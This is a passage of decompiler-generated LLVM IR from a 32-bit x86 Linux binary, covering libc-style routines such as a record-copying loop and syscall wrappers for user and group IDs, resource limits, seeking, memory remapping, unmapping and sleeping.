  store i32 %v1_8051c97, i32* %eax.global-to-local, align 4
  %v0_8051c9f = load i32, i32* @esi, align 4
  %v15_8051c9f = icmp eq i32 %v0_8051c9f, %tmp14
  %v1_8051ca2 = icmp eq i1 %v15_8051c9f, false
  br i1 %v1_8051ca2, label %dec_label_pc_8051d10, label %dec_label_pc_8051ca4

dec_label_pc_8051ca4:                             ; preds = %dec_label_pc_8051c8c
  %v1_8051ca4 = call i32 @function_804fe1b(i32 %v2_8051c82)
  store i32 %v1_8051ca4, i32* %eax.global-to-local, align 4
  %v1_8051ca9 = inttoptr i32 %v1_8051ca4 to i32*
  store i32 22, i32* %v1_8051ca9, align 4
  br label %dec_label_pc_8051d15

dec_label_pc_8051cb4:                             ; preds = %dec_label_pc_8051c72
  %v1_8051cb4 = add i32 %v0_8051cc032, 8
  %v2_8051cb4 = inttoptr i32 %v1_8051cb4 to i32*
  %v3_8051cb4 = load i32, i32* %v2_8051cb4, align 4
  store i32 %v3_8051cb4, i32* %eax.global-to-local, align 4
  %v1_8051cb7 = add i32 %v0_8051cc032, 12
  %v2_8051cb7 = inttoptr i32 %v1_8051cb7 to i32*
  %v3_8051cb7 = load i32, i32* %v2_8051cb7, align 4
  %v1_8051cc0 = inttoptr i32 %v0_8051cc032 to i32*
  %v2_8051cc0 = load i32, i32* %v1_8051cc0, align 4
  store i32 %v2_8051cc0, i32* %eax.global-to-local, align 4
  %v1_8051cc2 = add i32 %v0_8051cc032, 4
  %v2_8051cc2 = inttoptr i32 %v1_8051cc2 to i32*
  %v3_8051cc2 = load i32, i32* %v2_8051cc2, align 4
  %v2_8051cc5 = add i32 %v1_8051cc531, 4
  %v3_8051cc5 = inttoptr i32 %v2_8051cc5 to i32*
  store i32 %v3_8051cc2, i32* %v3_8051cc5, align 4
  %v0_8051cc8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051cc8 = load i32, i32* @esi, align 4
  %v2_8051cc8 = inttoptr i32 %v1_8051cc8 to i32*
  store i32 %v0_8051cc8, i32* %v2_8051cc8, align 4
  %v0_8051cca = load i32, i32* @ebx, align 4
  %v1_8051cca = add i32 %v0_8051cca, 8
  %v2_8051cca = inttoptr i32 %v1_8051cca to i32*
  %v3_8051cca = load i32, i32* %v2_8051cca, align 4
  store i32 %v3_8051cca, i32* %eax.global-to-local, align 4
  %v1_8051ccd = add i32 %v0_8051cca, 12
  %v2_8051ccd = inttoptr i32 %v1_8051ccd to i32*
  %v3_8051ccd = load i32, i32* %v2_8051ccd, align 4
  %v1_8051cd0 = load i32, i32* @esi, align 4
  %v2_8051cd0 = add i32 %v1_8051cd0, 12
  %v3_8051cd0 = inttoptr i32 %v2_8051cd0 to i32*
  store i32 %v3_8051ccd, i32* %v3_8051cd0, align 4
  %v0_8051cd3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051cd3 = load i32, i32* @esi, align 4
  %v2_8051cd3 = add i32 %v1_8051cd3, 8
  %v3_8051cd3 = inttoptr i32 %v2_8051cd3 to i32*
  store i32 %v0_8051cd3, i32* %v3_8051cd3, align 4
  %v0_8051cd6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051cd6 = trunc i32 %v0_8051cd6 to i16
  %v2_8051cd6 = load i32, i32* @esi, align 4
  %v3_8051cd6 = add i32 %v2_8051cd6, 16
  %v4_8051cd6 = inttoptr i32 %v3_8051cd6 to i16*
  store i16 %v1_8051cd6, i16* %v4_8051cd6, align 2
  %v0_8051cda = load i32, i32* @ebx, align 4
  %v1_8051cda = add i32 %v0_8051cda, 18
  %v2_8051cda = inttoptr i32 %v1_8051cda to i8*
  %v3_8051cda = load i8, i8* %v2_8051cda, align 1
  %v4_8051cda = zext i8 %v3_8051cda to i32
  %v5_8051cda = load i32, i32* %eax.global-to-local, align 4
  %v6_8051cda = and i32 %v5_8051cda, -256
  %v7_8051cda = or i32 %v6_8051cda, %v4_8051cda
  store i32 %v7_8051cda, i32* %eax.global-to-local, align 4
  %v2_8051cdd = load i32, i32* @esi, align 4
  %v3_8051cdd = add i32 %v2_8051cdd, 18
  %v4_8051cdd = inttoptr i32 %v3_8051cdd to i8*
  store i8 %v3_8051cda, i8* %v4_8051cdd, align 1
  %v0_8051ce0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051ce0 = load i32, i32* @esp, align 4
  %v2_8051ce0 = add i32 %v1_8051ce0, -4
  %v3_8051ce0 = inttoptr i32 %v2_8051ce0 to i32*
  store i32 %v0_8051ce0, i32* %v3_8051ce0, align 4
  %v0_8051ce1 = load i32, i32* @ebx, align 4
  %v1_8051ce1 = add i32 %v0_8051ce1, 16
  %v2_8051ce1 = inttoptr i32 %v1_8051ce1 to i16*
  %v3_8051ce1 = load i16, i16* %v2_8051ce1, align 2
  %v4_8051ce1 = zext i16 %v3_8051ce1 to i32
  %v1_8051ce5 = add nsw i32 %v4_8051ce1, -19
  %v2_8051ce8 = add i32 %v1_8051ce0, -8
  %v3_8051ce8 = inttoptr i32 %v2_8051ce8 to i32*
  store i32 %v1_8051ce5, i32* %v3_8051ce8, align 4
  %v0_8051ce9 = load i32, i32* @ebx, align 4
  %v1_8051ce9 = add i32 %v0_8051ce9, 19
  %v2_8051cec = add i32 %v1_8051ce0, -12
  %v3_8051cec = inttoptr i32 %v2_8051cec to i32*
  store i32 %v1_8051ce9, i32* %v3_8051cec, align 4
  %v0_8051ced = load i32, i32* @esi, align 4
  %v1_8051ced = add i32 %v0_8051ced, 19
  store i32 %v1_8051ced, i32* %eax.global-to-local, align 4
  %v2_8051cf0 = add i32 %v1_8051ce0, -16
  %v3_8051cf0 = inttoptr i32 %v2_8051cf0 to i32*
  store i32 %v1_8051ced, i32* %v3_8051cf0, align 4
  %v3_8051cf1 = inttoptr i32 %v2_8051c82 to i16*
  %v4_8051cf1 = call i32 @function_805201a(i16* %v3_8051cf1, i32 %v3_8051cb4, i32 %v3_8051cb7)
  store i32 %v4_8051cf1, i32* %eax.global-to-local, align 4
  %v0_8051cf6 = load i32, i32* @ebx, align 4
  %v1_8051cf6 = add i32 %v0_8051cf6, 16
  %v2_8051cf6 = inttoptr i32 %v1_8051cf6 to i16*
  %v3_8051cf6 = load i16, i16* %v2_8051cf6, align 2
  %v4_8051cf6 = zext i16 %v3_8051cf6 to i32
  store i32 %v2_8051c82, i32* @esi, align 4
  %v2_8051cfd = add i32 %v4_8051cf6, %v0_8051cf6
  store i32 %v2_8051cfd, i32* @ebx, align 4
  %v0_8051cff = load i32, i32* @esp, align 4
  %v1_8051cff = add i32 %v0_8051cff, 16
  store i32 %v5_8051d05, i32* %eax.global-to-local, align 4
  %v7_8051d08 = icmp ult i32 %v2_8051cfd, %v5_8051d05
  br i1 %v7_8051d08, label %dec_label_pc_8051c72, label %dec_label_pc_8051d10

dec_label_pc_8051d10:                             ; preds = %dec_label_pc_8051c59, %dec_label_pc_8051cb4, %dec_label_pc_8051c8c
  %v0_8051d10 = phi i32 [ %v0_8051c9f, %dec_label_pc_8051c8c ], [ %tmp14, %dec_label_pc_8051c59 ], [ %v2_8051c82, %dec_label_pc_8051cb4 ]
  store i32 %v0_8051d10, i32* %eax.global-to-local, align 4
  %v5_8051d12 = sub i32 %v0_8051d10, %tmp14
  br label %dec_label_pc_8051d15

dec_label_pc_8051d15:                             ; preds = %dec_label_pc_8051ca4, %dec_label_pc_8051c44, %dec_label_pc_8051d10
  %storemerge = phi i32 [ %v5_8051d12, %dec_label_pc_8051d10 ], [ -1, %dec_label_pc_8051c44 ], [ -1, %dec_label_pc_8051ca4 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8051c0e, i32* @ebx, align 4
  store i32 %v0_8051c0c, i32* %edi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8051d10, { 1, 0 }
  uselistorder i32 %v2_8051cfd, { 0, 2, 1 }
  uselistorder i32 %v3_8051cb7, { 1, 0 }
  uselistorder i32 %v3_8051cb4, { 1, 2, 0 }
  uselistorder i32 %v2_8051c82, { 0, 5, 6, 1, 2, 4, 3 }
  uselistorder i32 %v0_8051c8c30, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8051cc032, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v5_8051d05, { 2, 3, 0, 1 }
  uselistorder i32 %v5_8051c37, { 0, 3, 2, 1, 4 }
  uselistorder i32 %tmp14, { 5, 0, 2, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 17, 2, 16, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 1, 18, 0, 19 }
  uselistorder i32 (i16*, i32, i32)* @function_805201a, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 19, { 1, 2, 3, 0 }
  uselistorder i32 18, { 1, 2, 3, 0 }
  uselistorder i32 22, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 -12, { 0, 5, 27, 28, 18, 19, 20, 21, 7, 1, 22, 15, 13, 23, 9, 10, 16, 11, 12, 6, 17, 2, 24, 14, 8, 3, 25, 26, 4 }
  uselistorder i32 -8, { 0, 3, 33, 27, 29, 28, 30, 31, 32, 17, 18, 19, 20, 5, 6, 21, 14, 12, 22, 8, 9, 15, 10, 11, 4, 16, 23, 24, 13, 7, 1, 25, 26, 2 }
  uselistorder i32* @esp, { 9, 10, 11, 2, 3, 4, 22, 23, 24, 25, 26, 27, 28, 29, 85, 86, 5, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 7, 73, 8, 103, 104, 105, 17, 18, 19, 20, 21, 62, 63, 64, 65, 66, 67, 41, 42, 43, 44, 45, 46, 74, 75, 76, 0, 77, 78, 79, 80, 81, 82, 83, 84, 57, 58, 59, 60, 61, 68, 1, 69, 70, 71, 72, 106, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 12, 13, 14, 15, 16, 99, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 100, 101, 102, 107, 108, 109, 110, 137, 111, 112, 113, 114, 115, 117, 118, 116, 119, 120, 121, 122, 123, 124, 133, 134, 135, 125, 126, 127, 128, 129, 130, 131, 132, 6, 136 }
  uselistorder i32 15, { 2, 1, 3, 0 }
  uselistorder i32 -16, { 0, 7, 43, 44, 31, 32, 33, 34, 11, 1, 35, 8, 25, 26, 21, 22, 17, 36, 37, 12, 13, 14, 15, 16, 27, 28, 18, 19, 20, 9, 10, 29, 30, 3, 38, 39, 23, 24, 2, 4, 5, 40, 41, 42, 6 }
  uselistorder i32 30, { 3, 2, 1, 0, 4 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051d15, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051d10, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051c72, { 1, 0 }
}

define i32 @function_8051d1d() local_unnamed_addr {
dec_label_pc_8051d1d:
  %stack_var_-8 = alloca i32, align 4
  %v2_8051d20 = ptrtoint i32* %stack_var_-8 to i32
  %v2_8051d27 = call i32 @function_8051dc7(i32 7, i32 %v2_8051d20)
  store i32 256, i32* @edx, align 4
  %v2_8051d34 = icmp slt i32 %v2_8051d27, 0
  br i1 %v2_8051d34, label %dec_label_pc_8051d3c, label %dec_label_pc_8051d38

dec_label_pc_8051d38:                             ; preds = %dec_label_pc_8051d1d
  %v3_8051d38 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8051d38, i32* @edx, align 4
  br label %dec_label_pc_8051d3c

dec_label_pc_8051d3c:                             ; preds = %dec_label_pc_8051d1d, %dec_label_pc_8051d38
  %v0_8051d3c = phi i32 [ 256, %dec_label_pc_8051d1d ], [ %v3_8051d38, %dec_label_pc_8051d38 ]
  ret i32 %v0_8051d3c

; uselistorder directives
  uselistorder i32 7, { 3, 0, 4, 1, 2, 7, 8, 9, 6, 5 }
  uselistorder label %dec_label_pc_8051d3c, { 1, 0 }
}

define i32 @function_8051d42() local_unnamed_addr {
dec_label_pc_8051d42:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051d42 = load i32, i32* @ebx, align 4
  store i32 %v0_8051d42, i32* %stack_var_-4, align 4
  %v1_8051d4b = call i32 @int80_syscall(i32 202)
  store i32 %v1_8051d4b, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8051d4b, -4095
  br i1 %tmp7, label %dec_label_pc_8051d62, label %dec_label_pc_8051d56

dec_label_pc_8051d56:                             ; preds = %dec_label_pc_8051d42
  %v1_8051d56 = call i32 @function_804fe1b(i32 %v0_8051d42)
  %v0_8051d5b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051d5b = sub i32 0, %v0_8051d5b
  %v2_8051d5d = inttoptr i32 %v1_8051d56 to i32*
  store i32 %v1_8051d5b, i32* %v2_8051d5d, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051d66.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051d62

dec_label_pc_8051d62:                             ; preds = %dec_label_pc_8051d42, %dec_label_pc_8051d56
  %v2_8051d66 = phi i32 [ %v0_8051d42, %dec_label_pc_8051d42 ], [ %v2_8051d66.pre, %dec_label_pc_8051d56 ]
  %v0_8051d62 = phi i32 [ %v1_8051d4b, %dec_label_pc_8051d42 ], [ -1, %dec_label_pc_8051d56 ]
  store i32 %v2_8051d66, i32* @ebx, align 4
  ret i32 %v0_8051d62

; uselistorder directives
  uselistorder i32 %v1_8051d4b, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051d62, { 1, 0 }
}

define i32 @function_8051d68() local_unnamed_addr {
dec_label_pc_8051d68:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051d68 = load i32, i32* @ebx, align 4
  store i32 %v0_8051d68, i32* %stack_var_-4, align 4
  %v1_8051d71 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8051d71, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8051d71, -4095
  br i1 %tmp7, label %dec_label_pc_8051d88, label %dec_label_pc_8051d7c

dec_label_pc_8051d7c:                             ; preds = %dec_label_pc_8051d68
  %v1_8051d7c = call i32 @function_804fe1b(i32 %v0_8051d68)
  %v0_8051d81 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051d81 = sub i32 0, %v0_8051d81
  %v2_8051d83 = inttoptr i32 %v1_8051d7c to i32*
  store i32 %v1_8051d81, i32* %v2_8051d83, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051d8c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051d88

dec_label_pc_8051d88:                             ; preds = %dec_label_pc_8051d68, %dec_label_pc_8051d7c
  %v2_8051d8c = phi i32 [ %v0_8051d68, %dec_label_pc_8051d68 ], [ %v2_8051d8c.pre, %dec_label_pc_8051d7c ]
  %v0_8051d88 = phi i32 [ %v1_8051d71, %dec_label_pc_8051d68 ], [ -1, %dec_label_pc_8051d7c ]
  store i32 %v2_8051d8c, i32* @ebx, align 4
  ret i32 %v0_8051d88

; uselistorder directives
  uselistorder i32 %v1_8051d71, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051d88, { 1, 0 }
}

define i32 @function_8051d8e() local_unnamed_addr {
dec_label_pc_8051d8e:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051d8e = load i32, i32* @ebx, align 4
  store i32 %v0_8051d8e, i32* %stack_var_-4, align 4
  %v1_8051d97 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8051d97, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8051d97, -4095
  br i1 %tmp7, label %dec_label_pc_8051dae, label %dec_label_pc_8051da2

dec_label_pc_8051da2:                             ; preds = %dec_label_pc_8051d8e
  %v1_8051da2 = call i32 @function_804fe1b(i32 %v0_8051d8e)
  %v0_8051da7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051da7 = sub i32 0, %v0_8051da7
  %v2_8051da9 = inttoptr i32 %v1_8051da2 to i32*
  store i32 %v1_8051da7, i32* %v2_8051da9, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051db2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051dae

dec_label_pc_8051dae:                             ; preds = %dec_label_pc_8051d8e, %dec_label_pc_8051da2
  %v2_8051db2 = phi i32 [ %v0_8051d8e, %dec_label_pc_8051d8e ], [ %v2_8051db2.pre, %dec_label_pc_8051da2 ]
  %v0_8051dae = phi i32 [ %v1_8051d97, %dec_label_pc_8051d8e ], [ -1, %dec_label_pc_8051da2 ]
  store i32 %v2_8051db2, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051dae

; uselistorder directives
  uselistorder i32 %v1_8051d97, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051dae, { 1, 0 }
}

define i32 @function_8051db4() local_unnamed_addr {
dec_label_pc_8051db4:
  %v0_8051db4 = load i32, i32* @global_var_8053a64.63, align 4
  %v1_8051dbe = icmp eq i32 %v0_8051db4, 0
  %.v0_8051db4 = select i1 %v1_8051dbe, i32 4096, i32 %v0_8051db4
  store i32 %.v0_8051db4, i32* @edx, align 4
  ret i32 %.v0_8051db4

; uselistorder directives
  uselistorder i32 4096, { 0, 2, 3, 1 }
}

define i32 @function_8051dc7(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051dc7:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051dc7 = load i32, i32* @ebx, align 4
  store i32 %v0_8051dc7, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8051dda = call i32 @int80_syscall(i32 191)
  store i32 %v1_8051dda, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8051dda, -4095
  br i1 %tmp9, label %dec_label_pc_8051df3, label %dec_label_pc_8051de7

dec_label_pc_8051de7:                             ; preds = %dec_label_pc_8051dc7
  %v1_8051de7 = call i32 @function_804fe1b(i32 %v0_8051dc7)
  %v0_8051dec = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051dec = sub i32 0, %v0_8051dec
  %v2_8051dee = inttoptr i32 %v1_8051de7 to i32*
  store i32 %v1_8051dec, i32* %v2_8051dee, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051df7.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051df3

dec_label_pc_8051df3:                             ; preds = %dec_label_pc_8051dc7, %dec_label_pc_8051de7
  %v2_8051df7 = phi i32 [ %v0_8051dc7, %dec_label_pc_8051dc7 ], [ %v2_8051df7.pre, %dec_label_pc_8051de7 ]
  %v0_8051df3 = phi i32 [ %v1_8051dda, %dec_label_pc_8051dc7 ], [ -1, %dec_label_pc_8051de7 ]
  store i32 %v2_8051df7, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051df3

; uselistorder directives
  uselistorder i32 %v1_8051dda, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051df3, { 1, 0 }
}

define i32 @function_8051df9() local_unnamed_addr {
dec_label_pc_8051df9:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051df9 = load i32, i32* @ebx, align 4
  store i32 %v0_8051df9, i32* %stack_var_-4, align 4
  %v1_8051e02 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8051e02, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8051e02, -4095
  br i1 %tmp7, label %dec_label_pc_8051e19, label %dec_label_pc_8051e0d

dec_label_pc_8051e0d:                             ; preds = %dec_label_pc_8051df9
  %v1_8051e0d = call i32 @function_804fe1b(i32 %v0_8051df9)
  %v0_8051e12 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051e12 = sub i32 0, %v0_8051e12
  %v2_8051e14 = inttoptr i32 %v1_8051e0d to i32*
  store i32 %v1_8051e12, i32* %v2_8051e14, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051e1d.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051e19

dec_label_pc_8051e19:                             ; preds = %dec_label_pc_8051df9, %dec_label_pc_8051e0d
  %v2_8051e1d = phi i32 [ %v0_8051df9, %dec_label_pc_8051df9 ], [ %v2_8051e1d.pre, %dec_label_pc_8051e0d ]
  %v0_8051e19 = phi i32 [ %v1_8051e02, %dec_label_pc_8051df9 ], [ -1, %dec_label_pc_8051e0d ]
  store i32 %v2_8051e1d, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051e19

; uselistorder directives
  uselistorder i32 %v1_8051e02, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051e19, { 1, 0 }
}

define i32 @function_8051e1f(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051e1f:
  %esi.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v2_8051e35 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8051e35, i32* %esi.global-to-local, align 4
  %v1_8051e4c = call i32 @int80_syscall(i32 140)
  store i32 %v1_8051e4c, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_8051e4c, -4095
  br i1 %tmp18, label %dec_label_pc_8051e66, label %dec_label_pc_8051e58

dec_label_pc_8051e58:                             ; preds = %dec_label_pc_8051e1f
  %v2_8051e39 = ashr i32 %tmp8, 31
  %v1_8051e58 = call i32 @function_804fe1b(i32 %v2_8051e39)
  %v0_8051e5d = load i32, i32* %esi.global-to-local, align 4
  %v1_8051e5d = sub i32 0, %v0_8051e5d
  %v2_8051e5f = inttoptr i32 %v1_8051e58 to i32*
  store i32 %v1_8051e5d, i32* %v2_8051e5f, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051e6a

dec_label_pc_8051e66:                             ; preds = %dec_label_pc_8051e1f
  %v1_8051e66 = icmp eq i32 %v1_8051e4c, 0
  br i1 %v1_8051e66, label %dec_label_pc_8051e6f, label %dec_label_pc_8051e6a

dec_label_pc_8051e6a:                             ; preds = %dec_label_pc_8051e66, %dec_label_pc_8051e58
  %v0_8051e6a = phi i32 [ %v1_8051e4c, %dec_label_pc_8051e66 ], [ -1, %dec_label_pc_8051e58 ]
  br label %dec_label_pc_8051e77

dec_label_pc_8051e6f:                             ; preds = %dec_label_pc_8051e66
  %v3_8051e6f = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8051e77

dec_label_pc_8051e77:                             ; preds = %dec_label_pc_8051e6a, %dec_label_pc_8051e6f
  %v0_8051e7d = phi i32 [ %v0_8051e6a, %dec_label_pc_8051e6a ], [ %v3_8051e6f, %dec_label_pc_8051e6f ]
  ret i32 %v0_8051e7d

; uselistorder directives
  uselistorder i32 %v1_8051e4c, { 1, 2, 0, 3 }
  uselistorder i32 31, { 5, 3, 0, 1, 4, 2, 6 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051e77, { 1, 0 }
}

define i32 @function_8051e7e(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_8051e7e:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051e7f = load i32, i32* @esi, align 4
  store i32 %v0_8051e7f, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8051e97 = load i32, i32* @ebx, align 4
  %v5_8051e9f = call i32* (i32*, i32, i32, i32, ...) @mremap(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v6_8051e9f = ptrtoint i32* %v5_8051e9f to i32
  store i32 %v0_8051e97, i32* @ebx, align 4
  store i32 %v6_8051e9f, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ugt i32* %v5_8051e9f, inttoptr (i32 -4096 to i32*)
  br i1 %tmp13, label %dec_label_pc_8051eab, label %dec_label_pc_8051eb7

dec_label_pc_8051eab:                             ; preds = %dec_label_pc_8051e7e
  %v1_8051eab = call i32 @function_804fe1b(i32 %v0_8051e97)
  %v0_8051eb0 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051eb0 = sub i32 0, %v0_8051eb0
  %v2_8051eb2 = inttoptr i32 %v1_8051eab to i32*
  store i32 %v1_8051eb0, i32* %v2_8051eb2, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8051eba.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051eb7

dec_label_pc_8051eb7:                             ; preds = %dec_label_pc_8051e7e, %dec_label_pc_8051eab
  %v2_8051eba = phi i32 [ %v0_8051e7f, %dec_label_pc_8051e7e ], [ %v2_8051eba.pre, %dec_label_pc_8051eab ]
  %v0_8051eb7 = phi i32 [ %v6_8051e9f, %dec_label_pc_8051e7e ], [ -1, %dec_label_pc_8051eab ]
  store i32 %v2_8051eba, i32* @esi, align 4
  ret i32 %v0_8051eb7

; uselistorder directives
  uselistorder i32 %v0_8051e97, { 1, 0 }
  uselistorder label %dec_label_pc_8051eb7, { 1, 0 }
}

define i32 @function_8051ebd(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051ebd:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051ebd = load i32, i32* @ebx, align 4
  store i32 %v0_8051ebd, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_8051ed0 = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_8051ed0, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_8051ed0, -4095
  br i1 %tmp10, label %dec_label_pc_8051ee9, label %dec_label_pc_8051edd

dec_label_pc_8051edd:                             ; preds = %dec_label_pc_8051ebd
  %v1_8051edd = call i32 @function_804fe1b(i32 %v0_8051ebd)
  %v0_8051ee2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051ee2 = sub i32 0, %v0_8051ee2
  %v2_8051ee4 = inttoptr i32 %v1_8051edd to i32*
  store i32 %v1_8051ee2, i32* %v2_8051ee4, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051eed.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051ee9

dec_label_pc_8051ee9:                             ; preds = %dec_label_pc_8051ebd, %dec_label_pc_8051edd
  %v2_8051eed = phi i32 [ %v0_8051ebd, %dec_label_pc_8051ebd ], [ %v2_8051eed.pre, %dec_label_pc_8051edd ]
  %v0_8051ee9 = phi i32 [ %v3_8051ed0, %dec_label_pc_8051ebd ], [ -1, %dec_label_pc_8051edd ]
  %v2_8051eeb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051eeb, i32* @edx, align 4
  store i32 %v2_8051eed, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051ee9

; uselistorder directives
  uselistorder i32 %v3_8051ed0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051ee9, { 1, 0 }
}

define i32 @function_8051eef(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051eef:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_8051eef = load i32, i32* @ebx, align 4
  store i32 %v0_8051eef, i32* %stack_var_-4, align 4
  %v4_8051ef3 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8051ef3, i32* %ebx.global-to-local, align 4
  %v6_8051f02 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_8051f02, i32* %ebx.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_8051f02, -4095
  br i1 %tmp11, label %dec_label_pc_8051f1b, label %dec_label_pc_8051f0f

dec_label_pc_8051f0f:                             ; preds = %dec_label_pc_8051eef
  %v1_8051f0f = call i32 @function_804fe1b(i32 %v0_8051eef)
  %v0_8051f14 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051f14 = sub i32 0, %v0_8051f14
  %v2_8051f16 = inttoptr i32 %v1_8051f0f to i32*
  store i32 %v1_8051f14, i32* %v2_8051f16, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051f1f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051f1b

dec_label_pc_8051f1b:                             ; preds = %dec_label_pc_8051eef, %dec_label_pc_8051f0f
  %v2_8051f1f = phi i32 [ %v0_8051eef, %dec_label_pc_8051eef ], [ %v2_8051f1f.pre, %dec_label_pc_8051f0f ]
  %v0_8051f1b = phi i32 [ %v6_8051f02, %dec_label_pc_8051eef ], [ -1, %dec_label_pc_8051f0f ]
  store i32 %v2_8051f1f, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051f1b

; uselistorder directives
  uselistorder i32 %v6_8051f02, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051f1b, { 1, 0 }
}

define i32 @function_8051f21(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051f21:
  %stack_var_-12 = alloca i32, align 4
  %v0_8051f22 = load i32, i32* @ebx, align 4
  %v0_8051f26 = load i32, i32* @global_var_8053a78.70, align 8
